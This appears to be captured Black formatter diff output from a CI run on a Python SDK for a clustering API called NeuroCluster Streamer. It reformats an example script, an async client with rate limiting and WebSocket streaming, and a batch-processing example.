         print(f"❌ Health check failed: {e}")
         print("💡 Check your API URL and network connection")
         return
-    
+
     # =============================================================================
     # Example 3: Generate Sample Data
     # =============================================================================
     print("\n📊 Example 3: Generating Sample Data")
-    
+
     # Generate random 3D points for clustering
     def generate_sample_points(num_points: int = 20) -> List[List[float]]:
         """Generate random 3D points for demonstration."""
         points = []
-        
+
         # Create clusters around specific centers
         centers = [[0, 0, 0], [5, 5, 5], [10, 0, 10]]
-        
+
         for i in range(num_points):
             center = centers[i % len(centers)]
             # Add noise around the center
             point = [
                 center[0] + random.gauss(0, 1),
-                center[1] + random.gauss(0, 1), 
-                center[2] + random.gauss(0, 1)
+                center[1] + random.gauss(0, 1),
+                center[2] + random.gauss(0, 1),
             ]
             points.append(point)
-        
+
         return points
-    
+
     sample_points = generate_sample_points(15)
     print(f"✅ Generated {len(sample_points)} sample 3D points")
     print(f"   First few points: {sample_points[:3]}")
-    
+
     # =============================================================================
     # Example 4: Basic Point Processing
     # =============================================================================
     print("\n⚙️  Example 4: Processing Data Points")
-    
+
     try:
         # Process the points
         start_time = time.time()
         result = client.process_points(sample_points)
         processing_time = time.time() - start_time
-        
+
         print(f"✅ Processing completed in {processing_time:.3f} seconds")
         print(f"   Server processing time: {result.processing_time_ms:.2f} ms")
         print(f"   Algorithm quality: {result.algorithm_quality:.3f}")
         print(f"   Request ID: {result.request_id}")
         print(f"   Total points processed: {result.total_points}")
-        
+
         # Display cluster information
         print(f"\n📈 Clustering Results:")
         print(f"   Number of clusters: {len(result.clusters)}")
         print(f"   Number of outliers: {len(result.outliers)}")
-        
+
         for i, cluster in enumerate(result.clusters):
-            print(f"   Cluster {cluster.id}: {cluster.size} points, quality={cluster.quality:.3f}")
-            print(f"      Center: [{cluster.center[0]:.2f}, {cluster.center[1]:.2f}, {cluster.center[2]:.2f}]")
-        
+            print(
+                f"   Cluster {cluster.id}: {cluster.size} points, quality={cluster.quality:.3f}"
+            )
+            print(
+                f"      Center: [{cluster.center[0]:.2f}, {cluster.center[1]:.2f}, {cluster.center[2]:.2f}]"
+            )
+
         if result.outliers:
             print(f"   Outliers: {len(result.outliers)} points detected")
-    
+
     except ValidationError as e:
         print(f"❌ Validation error: {e.message}")
         print("💡 Check your data format - points should be lists of numbers")
-    
+
     except ProcessingError as e:
         print(f"❌ Processing error: {e.message}")
         print("💡 The algorithm may be overloaded or encountering issues")
-    
+
     except Exception as e:
         print(f"❌ Unexpected error during processing: {e}")
-    
+
     # =============================================================================
     # Example 5: Algorithm Status
     # =============================================================================
     print("\n📊 Example 5: Algorithm Status")
-    
+
     try:
         status = client.get_algorithm_status()
         print(f"✅ Algorithm Status Retrieved:")
         print(f"   Ready: {status.is_ready}")
         print(f"   Active clusters: {status.active_clusters}")
         print(f"   Total points processed: {status.total_points_processed}")
         print(f"   Clustering quality: {status.clustering_quality:.3f}")
         print(f"   Memory usage: {status.memory_usage_mb:.2f} MB")
         print(f"   Error count: {status.error_count}")
-        
+
         if status.error_count > 0:
             print("⚠️  Algorithm has encountered some errors")
-    
+
     except Exception as e:
         print(f"❌ Failed to get algorithm status: {e}")
-    
+
     # =============================================================================
     # Example 6: Cluster Summary
     # =============================================================================
     print("\n📋 Example 6: Cluster Summary")
-    
+
     try:
         summary = client.get_clusters_summary()
         print(f"✅ Cluster Summary:")
         print(f"   Total clusters: {summary.get('total_clusters', 0)}")
         print(f"   Average cluster size: {summary.get('average_cluster_size', 0):.1f}")
         print(f"   Total points: {summary.get('total_points', 0)}")
-        
+
         # Display top clusters if available
-        if 'top_clusters' in summary:
+        if "top_clusters" in summary:
             print(f"   Top clusters by size:")
-            for cluster in summary['top_clusters'][:3]:
+            for cluster in summary["top_clusters"][:3]:
                 print(f"      Cluster {cluster['id']}: {cluster['size']} points")
-    
+
     except Exception as e:
         print(f"❌ Failed to get cluster summary: {e}")
-    
+
     # =============================================================================
     # Example 7: Error Handling Patterns
     # =============================================================================
     print("\n🛡️  Example 7: Error Handling Patterns")
-    
+
     # Demonstrate different error scenarios
     try:
         # Try processing invalid data
         invalid_points = [["not", "a", "number"], [1, 2]]  # Mixed types and dimensions
         result = client.process_points(invalid_points)
-    
+
     except ValidationError as e:
         print(f"✅ Caught validation error as expected: {e.message}")
         print(f"   Error code: {e.error_code}")
         print(f"   Request ID: {e.request_id}")
-    
+
     except RateLimitError as e:
         print(f"⚠️  Rate limit exceeded: {e.message}")
         print(f"   Retry after: {e.retry_after} seconds")
-    
+
     except AuthenticationError as e:
         print(f"❌ Authentication failed: {e.message}")
         print("💡 Check your API key or JWT token")
-    
+
     except NCSError as e:
         print(f"❌ NCS API error: {e.message}")
         print(f"   Status code: {e.status_code}")
-    
+
     except Exception as e:
         print(f"❌ Unexpected error: {e}")
-    
+
     # =============================================================================
     # Example 8: Context Manager Usage
     # =============================================================================
     print("\n🔒 Example 8: Context Manager Usage")
-    
+
     # Using context manager for automatic cleanup
     try:
         with NCSClient(
             base_url="https://api.yourdomain.com",
-            api_key=os.getenv('NCS_API_KEY', 'demo-key'),
-            timeout=15.0
+            api_key=os.getenv("NCS_API_KEY", "demo-key"),
+            timeout=15.0,
         ) as context_client:
-            
             # Generate small dataset
             small_dataset = generate_sample_points(5)
             result = context_client.process_points(small_dataset)
-            
+
             print(f"✅ Context manager processing successful")
             print(f"   Processed {len(small_dataset)} points")
             print(f"   Found {len(result.clusters)} clusters")
-        
+
         print("✅ Context manager automatically closed the client")
-    
+
     except Exception as e:
         print(f"❌ Context manager example failed: {e}")
-    
+
     # =============================================================================
     # Example 9: Configuration Management
     # =============================================================================
     print("\n⚙️  Example 9: Configuration Management")
-    
+
     # Show how to create clients with different configurations
     configs = [
-        {
-            "name": "High timeout config",
-            "config": {"timeout": 60.0, "max_retries": 5}
-        },
-        {
-            "name": "Debug config", 
-            "config": {"log_level": "DEBUG", "verify_ssl": False}
-        },
+        {"name": "High timeout config", "config": {"timeout": 60.0, "max_retries": 5}},
+        {"name": "Debug config", "config": {"log_level": "DEBUG", "verify_ssl": False}},
         {
             "name": "Production config",
-            "config": {"timeout": 30.0, "max_retries": 3, "verify_ssl": True}
-        }
+            "config": {"timeout": 30.0, "max_retries": 3, "verify_ssl": True},
+        },
     ]
-    
+
     for config_example in configs:
         try:
             test_config = {
                 "base_url": "https://demo.ncs-api.com",
                 "api_key": "demo-key",
-                **config_example["config"]
+                **config_example["config"],
             }
-            
+
             test_client = NCSClient.from_config(test_config)
             print(f"✅ Created client with {config_example['name']}")
-            
+
             # Test the configuration
             health = test_client.health_check()
             print(f"   Health check successful: {health.status}")
-            
+
             test_client.close()
-        
+
         except Exception as e:
             print(f"❌ {config_example['name']} failed: {e}")
-    
+
     # =============================================================================
     # Cleanup and Summary
     # =============================================================================
     print("\n🎯 Example Summary")
     print("=" * 60)
@@ -315,20 +317,22 @@
     print("✅ Data point processing and clustering")
     print("✅ Algorithm status monitoring")
     print("✅ Comprehensive error handling")
     print("✅ Context manager usage")
     print("✅ Configuration management")
-    
+
     # Close the main client
     client.close()
     print("\n🔒 Client connection closed")
     print("\n🎉 Basic usage example completed successfully!")
 
+
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
         print("\n⏹️  Example interrupted by user")
     except Exception as e:
         print(f"\n💥 Example failed with error: {e}")
         import traceback
-        traceback.print_exc()
\ No newline at end of file
+
+        traceback.print_exc()
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/async_client.py	2025-06-10 20:31:25.483857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/async_client.py	2025-06-10 20:32:35.209616+00:00
@@ -23,74 +23,89 @@
 import httpx
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/async_client.py
 from tenacity import retry, stop_after_attempt, wait_exponential, AsyncRetrying
 
 # Import shared types and models from main client
 from .ncs_client import (
-    Point, Points, Cluster, ProcessingResult, AlgorithmStatus, HealthStatus,
-    NCSError, AuthenticationError, RateLimitError, ValidationError, 
-    ProcessingError, ConnectionError
+    Point,
+    Points,
+    Cluster,
+    ProcessingResult,
+    AlgorithmStatus,
+    HealthStatus,
+    NCSError,
+    AuthenticationError,
+    RateLimitError,
+    ValidationError,
+    ProcessingError,
+    ConnectionError,
 )
 
 # Configure logging
 logger = logging.getLogger(__name__)
 
 # =============================================================================
 # Async Rate Limiter
 # =============================================================================
 
+
 class AsyncRateLimiter:
     """Async rate limiter for API calls."""
-    
+
     def __init__(self, calls: int, period: float):
         self.calls = calls
         self.period = period
         self.calls_made = []
         self._lock = asyncio.Lock()
-    
+
     async def acquire(self):
         """Acquire rate limit permission."""
         async with self._lock:
             now = asyncio.get_event_loop().time()
-            
+
             # Remove old calls outside the period
-            self.calls_made = [call_time for call_time in self.calls_made 
-                             if now - call_time < self.period]
-            
+            self.calls_made = [
+                call_time
+                for call_time in self.calls_made
+                if now - call_time < self.period
+            ]
+
             # Check if we can make a call
             if len(self.calls_made) >= self.calls:
                 sleep_time = self.period - (now - self.calls_made[0])
                 if sleep_time > 0:
                     await asyncio.sleep(sleep_time)
                     return await self.acquire()
-            
+
             self.calls_made.append(now)
 
+
 # =============================================================================
 # Streaming Support
 # =============================================================================
+
 
 class StreamingConnection:
     """WebSocket connection for real-time streaming."""
-    
+
     def __init__(self, websocket, on_message: Optional[Callable] = None):
         self.websocket = websocket
         self.on_message = on_message
         self._running = False
         self._task = None
-    
+
     async def start_listening(self):
         """Start listening for incoming messages."""
         self._running = True
         self._task = asyncio.create_task(self._listen_loop())
-    
+
     async def _listen_loop(self):
         """Main listening loop for WebSocket messages."""
         try:
             async for message in self.websocket:
                 if not self._running:
                     break
-                
+
                 try:
                     data = json.loads(message)
                     if self.on_message:
                         await self.on_message(data)
                 except json.JSONDecodeError:
@@ -99,21 +114,21 @@
                     logger.error(f"Error processing message: {e}")
         except websockets.exceptions.ConnectionClosed:
             logger.info("WebSocket connection closed")
         except Exception as e:
             logger.error(f"WebSocket error: {e}")
-    
+
     async def send_point(self, point: Point):
         """Send a data point through the stream."""
-        message = json.dumps({'type': 'point', 'data': point})
+        message = json.dumps({"type": "point", "data": point})
         await self.websocket.send(message)
-    
+
     async def send_batch(self, points: Points):
         """Send a batch of points through the stream."""
-        message = json.dumps({'type': 'batch', 'data': points})
+        message = json.dumps({"type": "batch", "data": points})
         await self.websocket.send(message)
-    
+
     async def stop(self):
         """Stop the streaming connection."""
         self._running = False
         if self._task:
             self._task.cancel()
@@ -121,17 +136,19 @@
                 await self._task
             except asyncio.CancelledError:
                 pass
         await self.websocket.close()
 
+
 # =============================================================================
 # Async Client Class
 # =============================================================================
+
 
 class AsyncNCSClient:
     """Asynchronous client for the NeuroCluster Streamer API."""
-    
+
     def __init__(
         self,
         base_url: str,
         api_key: Optional[str] = None,
         jwt_token: Optional[str] = None,
@@ -140,15 +157,15 @@
         retry_delay: float = 1.0,
         verify_ssl: bool = True,
         headers: Optional[Dict[str, str]] = None,
         log_level: str = "INFO",
         max_connections: int = 100,
-        max_keepalive_connections: int = 20
+        max_keepalive_connections: int = 20,
     ):
         """
         Initialize the async NCS client.
-        
+
         Args:
             base_url: Base URL of the NCS API
             api_key: API key for authentication
             jwt_token: JWT token for authentication
             timeout: Request timeout in seconds
@@ -158,512 +175,512 @@
             headers: Additional headers to send with requests
             log_level: Logging level (DEBUG, INFO, WARNING, ERROR)
             max_connections: Maximum number of concurrent connections
             max_keepalive_connections: Maximum number of keepalive connections
         """
-        self.base_url = base_url.rstrip('/')
+        self.base_url = base_url.rstrip("/")
         self.api_key = api_key
         self.jwt_token = jwt_token
         self.timeout = timeout
         self.max_retries = max_retries
         self.retry_delay = retry_delay
         self.verify_ssl = verify_ssl
         self.logger = self._setup_logging(log_level)
-        
+
         # Setup HTTP client
         self.client = self._create_client(max_connections, max_keepalive_connections)
         self._setup_authentication()
-        
+
         # Add custom headers
         if headers:
             self.client.headers.update(headers)
-        
+
         # Rate limiter (100 calls per minute)
         self.rate_limiter = AsyncRateLimiter(calls=100, period=60)
-        
+
         # Streaming connections
         self._streaming_connections = {}
-    
+
     def _setup_logging(self, log_level: str) -> logging.Logger:
         """Setup logging for the async client."""
         logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
         logger.setLevel(getattr(logging, log_level.upper()))
-        
+
         if not logger.handlers:
             handler = logging.StreamHandler()
             formatter = logging.Formatter(
-                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
             )
             handler.setFormatter(formatter)
             logger.addHandler(handler)
-        
+
         return logger
-    
-    def _create_client(self, max_connections: int, max_keepalive_connections: int) -> httpx.AsyncClient:
+
+    def _create_client(
+        self, max_connections: int, max_keepalive_connections: int
+    ) -> httpx.AsyncClient:
         """Create async HTTP client with connection pooling."""
         limits = httpx.Limits(
             max_connections=max_connections,
-            max_keepalive_connections=max_keepalive_connections
-        )
-        
+            max_keepalive_connections=max_keepalive_connections,
+        )
+
         timeout = httpx.Timeout(self.timeout, connect=10.0)
-        
+
         return httpx.AsyncClient(
             limits=limits,
             timeout=timeout,
             verify=self.verify_ssl,
             headers={
-                'User-Agent': 'ncs-python-sdk-async/1.0.0',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            }
-        )
-    
+                "User-Agent": "ncs-python-sdk-async/1.0.0",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+            },
+        )
+
     def _setup_authentication(self):
         """Setup authentication headers."""
         if self.api_key:
-            self.client.headers['X-API-Key'] = self.api_key
+            self.client.headers["X-API-Key"] = self.api_key
         elif self.jwt_token:
-            self.client.headers['Authorization'] = f'***'
-    
+            self.client.headers["Authorization"] = f"***"
+
     async def authenticate(self, username: str, password: str) -> str:
         """
         Authenticate with username/password and get JWT token.
-        
+
         Args:
             username: Username for authentication
             password: Password for authentication
-            
+
         Returns:
             JWT token
-            
+
         Raises:
             AuthenticationError: If authentication fails
         """
         self.logger.info("Authenticating with username/password")
-        
-        auth_data = {
-            'username': username,
-            'password': password
-        }
-        
+
+        auth_data = {"username": username, "password": password}
+
         try:
             response = await self.client.post(
-                f'{self.base_url}/auth/login',
+                f"{self.base_url}/auth/login",
                 data=auth_data,
-                headers={'Content-Type': 'application/x-www-form-urlencoded'}
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
             )
-            
+
             if response.status_code == 200:
                 token_data = response.json()
-                self.jwt_token = token_data['access_token']
-                self.client.headers['Authorization'] = f'***'
+                self.jwt_token = token_data["access_token"]
+                self.client.headers["Authorization"] = f"***"
                 self.logger.info("Authentication successful")
                 return self.jwt_token
             else:
                 raise AuthenticationError(
                     "Authentication failed",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
-                
+
         except httpx.RequestError as e:
             raise ConnectionError(f"Authentication request failed: {str(e)}")
-    
+
     async def _make_request(
         self,
         method: str,
         endpoint: str,
         data: Optional[Dict] = None,
         params: Optional[Dict] = None,
-        use_rate_limit: bool = True
+        use_rate_limit: bool = True,
     ) -> httpx.Response:
         """
         Make async HTTP request with error handling and rate limiting.
-        
+
         Args:
             method: HTTP method (GET, POST, etc.)
             endpoint: API endpoint
             data: Request body data
             params: URL parameters
             use_rate_limit: Whether to apply rate limiting
-            
+
         Returns:
             Response object
-            
+
         Raises:
             Various NCSError subclasses based on response
         """
         if use_rate_limit:
             await self.rate_limiter.acquire()
-        
+
         url = f"{self.base_url}{endpoint}"
-        
+
         async for attempt in AsyncRetrying(
             stop=stop_after_attempt(self.max_retries),
-            wait=wait_exponential(multiplier=self.retry_delay, min=1, max=10)
+            wait=wait_exponential(multiplier=self.retry_delay, min=1, max=10),
         ):
             with attempt:
                 try:
                     self.logger.debug(f"Making async {method} request to {url}")
-                    
+
                     response = await self.client.request(
                         method=method,
                         url=url,
                         json=data if data else None,
-                        params=params
+                        params=params,
                     )
-                    
+
                     # Handle different response codes
                     if response.status_code == 200:
                         return response
                     elif response.status_code == 401:
                         raise AuthenticationError(
                             "Authentication required or token expired",
                             status_code=response.status_code,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
                     elif response.status_code == 403:
                         raise AuthenticationError(
                             "Insufficient permissions",
                             status_code=response.status_code,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
                     elif response.status_code == 429:
-                        retry_after = int(response.headers.get('Retry-After', 60))
+                        retry_after = int(response.headers.get("Retry-After", 60))
                         raise RateLimitError(
                             "Rate limit exceeded",
                             status_code=response.status_code,
                             retry_after=retry_after,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
                     elif response.status_code == 422:
-                        error_detail = response.json().get('detail', 'Validation error')
+                        error_detail = response.json().get("detail", "Validation error")
                         raise ValidationError(
                             error_detail,
                             status_code=response.status_code,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
                     elif response.status_code >= 500:
                         raise ProcessingError(
                             "Server error occurred",
                             status_code=response.status_code,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
                     else:
                         raise NCSError(
                             f"Unexpected response: {response.status_code}",
                             status_code=response.status_code,
-                            request_id=response.headers.get('X-Request-ID')
+                            request_id=response.headers.get("X-Request-ID"),
                         )
-                        
+
                 except httpx.RequestError as e:
                     raise ConnectionError(f"Request failed: {str(e)}")
-    
+
     async def health_check(self) -> HealthStatus:
         """
         Check API health status.
-        
+
         Returns:
             HealthStatus object
         """
         self.logger.debug("Checking API health")
-        
-        response = await self._make_request('GET', '/health')
+
+        response = await self._make_request("GET", "/health")
         data = response.json()
-        
+
         return HealthStatus(
-            status=data['status'],
-            timestamp=datetime.fromisoformat(data['timestamp'].replace('Z', '+00:00')),
-            version=data['version'],
-            algorithm_ready=data['algorithm_ready'],
-            uptime_seconds=data['uptime_seconds'],
-            components=data.get('components', {})
-        )
-    
+            status=data["status"],
+            timestamp=datetime.fromisoformat(data["timestamp"].replace("Z", "+00:00")),
+            version=data["version"],
+            algorithm_ready=data["algorithm_ready"],
+            uptime_seconds=data["uptime_seconds"],
+            components=data.get("components", {}),
+        )
+
     async def process_points(
-        self,
-        points: Points,
-        options: Optional[Dict[str, Any]] = None
+        self, points: Points, options: Optional[Dict[str, Any]] = None
     ) -> ProcessingResult:
         """
         Process data points through the clustering algorithm.
-        
+
         Args:
             points: List of data points to process
             options: Additional processing options
-            
+
         Returns:
             ProcessingResult with clusters and outliers
         """
         self.logger.info(f"Processing {len(points)} data points")
-        
-        request_data = {
-            'points': points
-        }
-        
+
+        request_data = {"points": points}
+
         if options:
             request_data.update(options)
-        
-        response = await self._make_request('POST', '/api/v1/process_points', data=request_data)
+
+        response = await self._make_request(
+            "POST", "/api/v1/process_points", data=request_data
+        )
         data = response.json()
-        
+
         # Parse clusters
         clusters = [
             Cluster(
-                id=cluster['id'],
-                center=cluster['center'],
-                points=cluster['points'],
-                size=cluster['size'],
-                quality=cluster['quality'],
-                created_at=cluster.get('created_at'),
-                last_updated=cluster.get('last_updated')
+                id=cluster["id"],
+                center=cluster["center"],
+                points=cluster["points"],
+                size=cluster["size"],
+                quality=cluster["quality"],
+                created_at=cluster.get("created_at"),
+                last_updated=cluster.get("last_updated"),
             )
-            for cluster in data['clusters']
+            for cluster in data["clusters"]
         ]
-        
+
         result = ProcessingResult(
             clusters=clusters,
-            outliers=data['outliers'],
-            processing_time_ms=data['processing_time_ms'],
-            algorithm_quality=data['algorithm_quality'],
-            request_id=data['request_id']
-        )
-        
-        self.logger.info(f"Processing complete: {len(clusters)} clusters, {len(data['outliers'])} outliers")
+            outliers=data["outliers"],
+            processing_time_ms=data["processing_time_ms"],
+            algorithm_quality=data["algorithm_quality"],
+            request_id=data["request_id"],
+        )
+
+        self.logger.info(
+            f"Processing complete: {len(clusters)} clusters, {len(data['outliers'])} outliers"
+        )
         return result
-    
-    async def get_clusters_summary(self, filters: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+
+    async def get_clusters_summary(
+        self, filters: Optional[Dict[str, Any]] = None
+    ) -> Dict[str, Any]:
         """
         Get summary of current clusters.
-        
+
         Args:
             filters: Optional filters for cluster selection
-            
+
         Returns:
             Cluster summary data
         """
         self.logger.debug("Getting clusters summary")
-        
+
         params = filters if filters else {}
-        response = await self._make_request('GET', '/api/v1/clusters_summary', params=params)
-        
+        response = await self._make_request(
+            "GET", "/api/v1/clusters_summary", params=params
+        )
+
         return response.json()
-    
+
     async def get_algorithm_status(self) -> AlgorithmStatus:
         """
         Get current algorithm status.
-        
+
         Returns:
             AlgorithmStatus object
         """
         self.logger.debug("Getting algorithm status")
-        
-        response = await self._make_request('GET', '/api/v1/algorithm_status')
+
+        response = await self._make_request("GET", "/api/v1/algorithm_status")
         data = response.json()
-        
+
         return AlgorithmStatus(
-            is_ready=data['is_ready'],
-            active_clusters=data['active_clusters'],
-            total_points_processed=data['total_points_processed'],
-            clustering_quality=data['clustering_quality'],
-            memory_usage_mb=data['memory_usage_mb'],
-            last_processing_time_ms=data['last_processing_time_ms'],
-            error_count=data.get('error_count', 0),
-            uptime_seconds=data.get('uptime_seconds', 0)
-        )
-    
+            is_ready=data["is_ready"],
+            active_clusters=data["active_clusters"],
+            total_points_processed=data["total_points_processed"],
+            clustering_quality=data["clustering_quality"],
+            memory_usage_mb=data["memory_usage_mb"],
+            last_processing_time_ms=data["last_processing_time_ms"],
+            error_count=data.get("error_count", 0),
+            uptime_seconds=data.get("uptime_seconds", 0),
+        )
+
     async def process_points_concurrent(
-        self,
-        points_batches: List[Points],
-        max_concurrent: int = 5
+        self, points_batches: List[Points], max_concurrent: int = 5
     ) -> List[ProcessingResult]:
         """
         Process multiple batches of points concurrently.
-        
+
         Args:
             points_batches: List of point batches to process
             max_concurrent: Maximum number of concurrent requests
-            
+
         Returns:
             List of ProcessingResult objects
         """
         semaphore = asyncio.Semaphore(max_concurrent)
-        
+
         async def process_batch(batch: Points) -> ProcessingResult:
             async with semaphore:
                 return await self.process_points(batch)
-        
+
         tasks = [process_batch(batch) for batch in points_batches]
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Handle exceptions
         processed_results = []
         for i, result in enumerate(results):
             if isinstance(result, Exception):
                 self.logger.error(f"Batch {i} failed: {result}")
                 raise result
             processed_results.append(result)
-        
+
         return processed_results
-    
+
     async def start_streaming(
-        self,
-        on_message: Optional[Callable] = None,
-        connection_id: str = "default"
+        self, on_message: Optional[Callable] = None, connection_id: str = "default"
     ) -> StreamingConnection:
         """
         Start a WebSocket streaming connection.
-        
+
         Args:
             on_message: Callback function for incoming messages
             connection_id: Unique identifier for this connection
-            
+
         Returns:
             StreamingConnection object
         """
-        ws_url = self.base_url.replace('http', 'ws') + '/ws/stream'
-        
+        ws_url = self.base_url.replace("http", "ws") + "/ws/stream"
+
         # Add authentication to WebSocket URL
         if self.api_key:
-            ws_url += f'?api_key={self.api_key}'
+            ws_url += f"?api_key={self.api_key}"
         elif self.jwt_token:
-            ws_url += f'?token={self.jwt_token}'
-        
+            ws_url += f"?token={self.jwt_token}"
+
         websocket = await websockets.connect(ws_url)
         connection = StreamingConnection(websocket, on_message)
-        
+
         self._streaming_connections[connection_id] = connection
         await connection.start_listening()
-        
+
         self.logger.info(f"Started streaming connection: {connection_id}")
         return connection
-    
+
     async def stop_streaming(self, connection_id: str = "default"):
         """
         Stop a streaming connection.
-        
+
         Args:
             connection_id: ID of the connection to stop
         """
         if connection_id in self._streaming_connections:
             await self._streaming_connections[connection_id].stop()
             del self._streaming_connections[connection_id]
             self.logger.info(f"Stopped streaming connection: {connection_id}")
-    
+
     async def process_stream(
         self,
         points_stream: AsyncGenerator[Points, None],
         batch_size: int = 100,
-        on_result: Optional[Callable[[ProcessingResult], None]] = None
+        on_result: Optional[Callable[[ProcessingResult], None]] = None,
     ):
         """
         Process a stream of points in batches.
-        
+
         Args:
             points_stream: Async generator yielding points
             batch_size: Size of processing batches
             on_result: Callback for processing results
         """
         batch = []
-        
+
         async for points in points_stream:
             batch.extend(points)
-            
+
             if len(batch) >= batch_size:
                 result = await self.process_points(batch[:batch_size])
                 if on_result:
                     await on_result(result)
                 batch = batch[batch_size:]
-        
+
         # Process remaining points
         if batch:
             result = await self.process_points(batch)
             if on_result:
                 await on_result(result)
-    
+
     async def close(self):
         """Close all connections and cleanup resources."""
         # Stop all streaming connections
         for connection_id in list(self._streaming_connections.keys()):
             await self.stop_streaming(connection_id)
-        
+
         # Close HTTP client
         await self.client.aclose()
         self.logger.debug("Async client closed")
-    
+
     async def __aenter__(self):
         """Async context manager entry."""
         return self
-    
+
     async def __aexit__(self, exc_type, exc_val, exc_tb):
         """Async context manager exit."""
         await self.close()
-    
+
     @classmethod
-    def from_config(cls, config: Dict[str, Any]) -> 'AsyncNCSClient':
+    def from_config(cls, config: Dict[str, Any]) -> "AsyncNCSClient":
         """
         Create async client from configuration dictionary.
-        
+
         Args:
             config: Configuration dictionary
-            
+
         Returns:
             Configured AsyncNCSClient instance
         """
         return cls(**config)
 
+
 # =============================================================================
 # Async Utilities
 # =============================================================================
 
+
 async def create_async_client(
-    base_url: str,
-    api_key: Optional[str] = None,
-    **kwargs
+    base_url: str, api_key: Optional[str] = None, **kwargs
 ) -> AsyncNCSClient:
     """
     Factory function to create an async NCS client.
-    
+
     Args:
         base_url: Base URL of the NCS API
         api_key: API key for authentication
         **kwargs: Additional client options
-        
+
     Returns:
         Configured AsyncNCSClient instance
     """
     return AsyncNCSClient(base_url=base_url, api_key=api_key, **kwargs)
 
+
 @asynccontextmanager
 async def async_client_context(base_url: str, api_key: Optional[str] = None, **kwargs):
     """
     Async context manager for NCS client.
-    
+
     Args:
         base_url: Base URL of the NCS API
         api_key: API key for authentication
         **kwargs: Additional client options
-        
+
     Yields:
         Configured AsyncNCSClient instance
     """
     client = AsyncNCSClient(base_url=base_url, api_key=api_key, **kwargs)
     try:
         yield client
     finally:
         await client.close()
 
+
 # =============================================================================
 # Module Exports
 # =============================================================================
 
 __all__ = [
     # Main classes
-    'AsyncNCSClient',
-    'StreamingConnection',
-    'AsyncRateLimiter',
-    
+    "AsyncNCSClient",
+    "StreamingConnection",
+    "AsyncRateLimiter",
     # Utilities
-    'create_async_client',
-    'async_client_context'
-]
\ No newline at end of file
+    "create_async_client",
+    "async_client_context",
+]
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/batch_processing.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/batch_processing.py	2025-06-10 20:32:35.513987+00:00
@@ -31,457 +31,484 @@
 
 # Add the parent directory to path for development
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from ncs_client import (
-    NCSClient, AsyncNCSClient, 
-    ProcessingResult, NCSError, RateLimitError,
-    configure_logging, async_client_context
+    NCSClient,
+    AsyncNCSClient,
+    ProcessingResult,
+    NCSError,
+    RateLimitError,
+    configure_logging,
+    async_client_context,
 )
+
 
 @dataclass
 class BatchProcessingStats:
     """Statistics for batch processing operations."""
+
     total_points: int = 0
     total_batches: int = 0
     successful_batches: int = 0
     failed_batches: int = 0
     total_clusters: int = 0
     total_outliers: int = 0
     total_processing_time: float = 0.0
     average_quality: float = 0.0
     start_time: Optional[float] = None
     end_time: Optional[float] = None
-    
+
     @property
     def elapsed_time(self) -> float:
         if self.start_time and self.end_time:
             return self.end_time - self.start_time
         return 0.0
-    
+
     @property
     def points_per_second(self) -> float:
         if self.elapsed_time > 0:
             return self.total_points / self.elapsed_time
         return 0.0
-    
+
     @property
     def success_rate(self) -> float:
         if self.total_batches > 0:
             return self.successful_batches / self.total_batches
         return 0.0
 
+
 class LargeDatasetGenerator:
     """Generates large synthetic datasets for batch processing demonstration."""
-    
+
     def __init__(self, num_clusters: int = 5, noise_level: float = 1.5):
         self.num_clusters = num_clusters
         self.noise_level = noise_level
-        
+
         # Generate cluster centers in 3D space
         self.cluster_centers = []
         for i in range(num_clusters):
             center = [
                 random.uniform(-20, 20),
-                random.uniform(-20, 20), 
-                random.uniform(-20, 20)
+                random.uniform(-20, 20),
+                random.uniform(-20, 20),
             ]
             self.cluster_centers.append(center)
-    
+
     def generate_points(self, num_points: int) -> List[List[float]]:
         """Generate a specified number of data points."""
         points = []
-        
+
         for _ in range(num_points):
             # Choose random cluster center
             center = random.choice(self.cluster_centers)
-            
+
             # Add noise around the center
             point = [
                 center[0] + random.gauss(0, self.noise_level),
                 center[1] + random.gauss(0, self.noise_level),
-                center[2] + random.gauss(0, self.noise_level)
+                center[2] + random.gauss(0, self.noise_level),
             ]
             points.append(point)
-        
+
         return points
-    
-    def generate_batches(self, total_points: int, batch_size: int) -> Iterator[List[List[float]]]:
+
+    def generate_batches(
+        self, total_points: int, batch_size: int
+    ) -> Iterator[List[List[float]]]:
         """Generate data in batches."""
         remaining = total_points
-        
+
         while remaining > 0:
             current_batch_size = min(batch_size, remaining)
             yield self.generate_points(current_batch_size)
             remaining -= current_batch_size
-    
+
     def save_to_csv(self, filename: str, num_points: int):
         """Save generated data to CSV file."""
         points = self.generate_points(num_points)
-        
-        with open(filename, 'w', newline='') as csvfile:
+
+        with open(filename, "w", newline="") as csvfile:
             writer = csv.writer(csvfile)
-            writer.writerow(['x', 'y', 'z'])  # Header
-            
+            writer.writerow(["x", "y", "z"])  # Header
+
             for point in points:
                 writer.writerow(point)
-        
+
         print(f"💾 Saved {num_points} points to {filename}")
+
 
 class BatchProgressTracker:
     """Tracks and displays progress for batch processing operations."""
-    
+
     def __init__(self, total_batches: int):
